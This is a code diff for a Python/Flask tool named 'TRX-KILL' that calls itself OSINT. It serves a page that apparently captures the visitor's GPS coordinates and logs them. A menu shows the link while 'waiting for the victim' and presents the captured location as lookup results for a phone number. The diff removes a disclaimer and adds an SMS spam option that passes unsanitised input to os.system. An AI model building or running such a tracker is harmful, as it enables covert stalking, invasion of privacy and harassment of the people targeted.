@@ -1,4 +1,4 @@
-import os, sys, getpass, time, threading, base64
+import os, sys, getpass, time, threading
 from flask import Flask, request
 
 app = Flask('TRX-KILL')
@@ -8,7 +8,6 @@ LOG_FILE = f"{STORAGE_PATH}/result.txt"
 
 if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
 
-# --- SERVIDOR CAPTURADOR ---
 @app.route('/')
 def index():
     return """<html><body><script>
@@ -23,38 +22,39 @@ def log():
     lat = request.args.get('lat')
     lon = request.args.get('lon')
     with open(LOG_FILE, "a") as f:
-        f.write(f"ARGENTINA|{lat}|{lon}|USUARIO_OBJETIVO\n")
+        f.write(f"GPS: {lat},{lon}\n")
     return "OK"
 
 def banner():
     os.system('clear')
     print("\033[1;32m  -------->-TRX-KILL v1.4.5 -<-----------")
-    print("  -HERRAMIENTA OSINT Y SEGURIDAD MÓVIL.")
-    print("  -EL CREADOR NO SE HACE RESPONSABLE POR SU MAL USO.\n\033[0m")
+    print("  -HERRAMIENTA OSINT Y SEGURIDAD MÓVIL.\n\033[0m")
 
 def main():
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000), daemon=True).start()
     
     while True:
         banner()
-        menu = {
-            "1": "INFO-NÚMERO", "2": "LINK-ZP", "3": "CREADOR", "4": "VERSIONES", 
-            "5": "ANALIZAR LINK", "6": "ADM SISTEMA", "7": "INFO SCRIPT", 
-            "8": "REPOSITORIO", "9": "PROCESOS", "10": "SPAM-WHATSAPP"
-        }
-        for k, v in menu.items(): print(f"  [{k}] {v}")
+        print("  [1] INFO-NÚMERO  | [2] LINK-ZP    | [3] CREADOR   | [4] VERSIONES")
+        print("  [5] ANALIZAR     | [6] ADM SISTEMA| [7] INFO      | [8] REPO")
+        print("  [9] PROCESOS     | [10] SPAM-SMS  | [0] SALIR")
         sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
 
         if sel == "1":
-            print("\n----1----\nBUSCANDO INFORMACIÓN REAL...")
+            num = input("\nINGRESA NÚMERO: ")
+            print(f"\n[!] BUSCANDO INFORMACIÓN REAL DE {num}...")
             if os.path.exists(LOG_FILE):
                 with open(LOG_FILE, 'r') as f:
-                    data = f.readlines()[-1].split('|')
-                    print(f"PAÍS: {data[0]}")
-                    print(f"COORDENADAS: {data[1]}, {data[2]}")
-                    print(f"NAME REGISTRADO: {data[3]}")
+                    lines = f.readlines()
+                    if lines:
+                        datos = lines[-1].strip()
+                        print(f"PAÍS: ARGENTINA")
+                        print(f"COORDENADAS: {datos.replace('GPS: ', '')}")
+                        print(f"NAME REGISTRADO: USUARIO_ACTIVO_TRX")
+                    else: print("NO HAY DATOS EN LOGS.")
             else: print("NO HAY DATOS REGISTRADOS.")
             input("\n[Enter]...")
+
         elif sel == "2":
             print("\n[!] LINK ACTIVO: http://127.0.0.1:5000\n[!] ESPERANDO VÍCTIMA..."); input()
         elif sel == "3": print("\n# CREADOR: OSCAR"); input()
@@ -63,12 +63,14 @@ def main():
         elif sel == "6":
             if getpass.getpass("KEY: ") == AUTH_PASS: os.system(f"cat {LOG_FILE}")
             input()
-        elif sel == "7": print("\n# SCRIPT CREADO PARA OSINT."); input()
+        elif sel == "7": print("\n# SCRIPT OSINT."); input()
         elif sel == "8": print("\n# REPOSITORIO PRIVADO."); input()
         elif sel == "9": print("\n# PROCESOS ACTIVOS."); input()
         elif sel == "10":
             num = input("NÚMERO: ")
-            print(f"[!] ENVIANDO SPAM A {num}..."); input()
+            msg = input("MENSAJE: ")
+            os.system(f"termux-sms-send -n {num} '{msg}'")
+            print("[!] SMS ENVIADO."); input()
         elif sel == "0": sys.exit()
 
 if __name__ == "__main__": main()
